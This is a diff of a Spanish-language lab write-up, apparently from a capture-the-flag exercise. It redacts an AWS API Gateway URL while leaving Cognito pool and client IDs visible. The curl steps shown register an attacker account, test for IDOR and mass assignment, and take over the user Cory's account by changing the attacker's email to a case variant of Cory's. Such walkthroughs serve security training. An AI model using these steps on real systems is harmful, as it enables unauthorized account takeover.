@@ -31,7 +31,7 @@ Accedemos a la URL proporcionada y, tras inspeccionar el código fuente de la p�
 
 - **Cognito User Pool ID**: `us-east-1_tKqOKijp9` — identificador del User Pool de Cognito.
 - **Cognito Client ID**: `7cfhph9m8mk8ukuco2m6qibdit` — identificador del cliente de Cognito.
-- **URL de la API**: `https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com` — endpoint de API Gateway.
+- **URL de la API**: `https://XXXXXXX.execute-api.us-east-1.amazonaws.com` — endpoint de API Gateway.
 
 **Contexto:** Amazon Cognito es un servicio de autenticación y autorización que permite registrar y autenticar usuarios. Un **User Pool** es un directorio de usuarios, y un **Client ID** identifica una aplicación que interactúa con el User Pool. La URL de la API Gateway es el punto de entrada para las funciones backend (probablemente Lambda) que manejan las solicitudes de autenticación y perfil.
 
@@ -44,7 +44,7 @@ Accedemos a la URL proporcionada y, tras inspeccionar el código fuente de la p�
 Usamos el endpoint `/register` de la API para crear un nuevo usuario. En la aplicación, este endpoint se comunica con Cognito y crea un usuario en el User Pool:
 
 ```bash
-curl -X POST https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/register \
+curl -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/register \
   -H "Content-Type: application/json" \
   -d '{"email": "attacker@hacksmarter.hsm", "password": "Password123!"}'
 ```
@@ -60,7 +60,7 @@ La cuenta se ha creado exitosamente.
 Iniciamos sesión con el usuario recién creado para obtener los tokens de autenticación:
 
 ```bash
-curl -s -X POST https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/login \
+curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/login \
   -H "Content-Type: application/json" \
   -d '{"email": "attacker@hacksmarter.hsm", "password": "Password123!"}' | jq
 ```
@@ -98,7 +98,7 @@ export ACCESS_TOKEN="[REDACTED]"
 Primero, verificamos que podemos obtener el perfil del usuario autenticado:
 
 ```bash
-curl -s -X GET https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/profile \
+curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
   -H "Authorization: Bearer $TOKEN" | jq
 ```
 
@@ -120,7 +120,7 @@ El endpoint `/profile` devuelve la información del usuario autenticado. Esto es
 A veces, los desarrolladores permiten que un usuario consulte el perfil de otro simplemente cambiando un parámetro (como el email o un ID). Probamos a enviar un email diferente en el cuerpo de la solicitud:
 
 ```bash
-curl -s -X GET https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/profile \
+curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"email":"cory@hacksmarter.hsm"}' | jq
@@ -144,7 +144,7 @@ La API ignora el parámetro y devuelve el perfil del usuario autenticado. No hay
 Probamos a enviar campos adicionales en la solicitud de actualización de perfil, intentando modificar atributos que no deberían ser editables:
 
 ```bash
-curl -s -X POST https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/update-profile \
+curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/update-profile \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"name":"Attacker", "flag":"true", "custom:flag":"true"}' | jq
@@ -159,7 +159,7 @@ curl -s -X POST https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/update-pr
 La API responde con éxito, pero al consultar el perfil nuevamente, los campos no se han actualizado:
 
 ```bash
-curl -s -X GET https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/profile \
+curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
   -H "Authorization: Bearer $TOKEN" | jq
 ```
 
@@ -319,7 +319,7 @@ El email ahora es `Cory@hacksmarter.hsm`.
 Ahora que el usuario atacante tiene el email de Cory, intentamos iniciar sesión como Cory usando nuestra contraseña original (`Password123!`):
 
 ```bash
-curl -s -X POST https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/login \
+curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/login \
   -H "Content-Type: application/json" \
   -d '{"email": "Cory@hacksmarter.hsm", "password": "Password123!"}' | jq
 ```
@@ -342,7 +342,7 @@ Exportamos el nuevo token y solicitamos el perfil:
 
 ```bash
 export TOKEN="[REDACTED]"
-curl -s -X GET https://n2fdn6bttd.execute-api.us-east-1.amazonaws.com/profile \
+curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
   -H "Authorization: Bearer $TOKEN" | jq
 ```
 
